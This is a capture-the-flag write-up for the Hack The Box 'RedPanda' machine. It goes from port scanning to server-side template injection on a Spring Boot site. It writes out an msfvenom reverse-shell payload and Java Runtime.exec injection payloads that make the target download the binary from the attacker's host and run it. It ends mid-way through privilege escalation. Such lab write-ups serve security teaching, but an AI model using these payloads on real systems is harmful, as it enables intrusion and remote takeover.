# Box: RedPanda
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A -v -p- -T4 10.129.74.211```

```
Nmap scan report for 10.129.74.211
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 23 Oct 2023 21:23:11 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 23 Oct 2023 21:23:11 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 23 Oct 2023 21:23:12 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=10/23%Time=6536E43F%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;chars
SF:et=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2023\x20Oct\x2
SF:02023\x2021:23:11\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20
SF:\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wood
SF:en_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codep
SF:en\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/
SF:css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20
SF:with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20
SF:\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20
SF:right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\
SF:x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20<
SF:/div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\
SF:x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20M
SF:on,\x2023\x20Oct\x202023\x2021:23:11\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text
SF:/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2043
SF:5\r\nDate:\x20Mon,\x2023\x20Oct\x202023\x2021:23:12\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>
SF:HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x
SF:20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h
SF:1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\
SF:x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14p
SF:x;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heig
SF:ht:1px;background-color:#525D76;border:none;}</style></head><body><h1>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></htm
SF:l>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/23%OT=22%CT=1%CU=33972%PV=Y%DS=2%DC=T%G=Y%TM=6536E4
OS:6B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 41.770 days (since Tue Sep 12 03:54:44 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   246.02 ms 10.10.14.1
2   246.03 ms 10.129.74.211

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 22:23:55 2023 -- 1 IP address (1 host up) scanned in 1144.35 seconds
```
From our nmap scan we have 2 open ports, port 22 which runs the ssh service and port 8080 which runs the http service. We will focus our enumeration today on port 8080.



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e12d0082-754a-41cf-8027-f01e3f60c4ac)

That's actually a cute panda

Checking the page source,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/af545ca8-8041-4406-a898-2ff2e16275c4)

The java framework being used here is ```spring boot```.

We can test this web application for ssti

<font color="Green">SSTI stands for Server-Side Template Injection. It is a security vulnerability that occurs in web applications when user-provided data is embedded directly into server-side templates without proper validation or sanitization. This can lead to the execution of arbitrary code on the server and potentially compromise the security of the application.
</font>





# Exploitation

We'll use a simple mathematical operation ```*{7*7}```

Lets see what happens when we use this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c26753af-227b-4990-9cf9-d0ac82c1fb79)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2f7e083-f5ef-40af-acd2-e76058b44dd9)

cool cool, our arithmetic got executed actually.

Now, lets look for a payload that can help us spawn a reverse shell

We'll start out by generating a malicious ```.elf``` file

command:```msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1234 -f elf > bankai.elf```

Ensure your provide your ```LHOST``` and ```LPORT```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/redpanda]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1234 -f elf > bankai.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/redpanda]
└─$ ls -la
total 20
drwxr-xr-x  2 bl4ck4non bl4ck4non 4096 Oct 23 23:00 .
drwxr-xr-x 21 bl4ck4non bl4ck4non 4096 Oct 23 22:02 ..
-rw-r--r--  1 bl4ck4non bl4ck4non  194 Oct 23 23:01 bankai.elf
```
smooth, what we'll do next is start a simple Http server in this directory

command:```python3 -m http.server 80```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f6a6c21c-e274-44c0-b6ac-0af6175b78ea)

On the target's website, we'll try to get the ```bankai.elf``` file using the ssti payload below

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://LHOST/bankai.elf")}
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef708a36-ffdb-46fb-8d6b-53c74cd4768c)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81819ef8-7598-4ae8-a529-7fe1748e1b2b)

Checking the python3 server we set up

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09aeb8a8-f3ff-4199-8059-4c2db94ccf34)

nice nice, it got the file

On the target's website, e can give the executable permission using the ssti payload below

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./bankai.elf")}
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e8eb4a9-9f00-43dd-b0bc-8d9c59e568a8)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13c7cc1c-e03b-4500-a39d-3803bf07d7d6)

Nice, there was no error.

Now, before we execute the executable file we sent, ensure you set up your netcat listener

To execute the "bankai.elf" file on the target's website we can use the ssti payload below

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./bankai.elf")}
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5a76ae5a-febc-405a-8455-03a69b6ebaa4)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e8da895-b3c8-450b-90ff-17f32fc2b8e9)

Checking the netcat listener we set up

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6866a3fc-2c41-4eda-bba9-3524c52e16af)

We spawned a shell hehe

To stabilize this shell

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bdaee41c-0c20-4195-9c44-f08769398d26)

Lets go ahead to escalate our privileges



# Privilege Escalation

Reading the source code for the web application I found something interesting

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e9d32896-a1ff-4d1e-8d50-9e8294dce50e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57440394-91e9-4a13-b562-5bcbb48f98ba)

The java file contain the password for the user ```woodenk```. 


















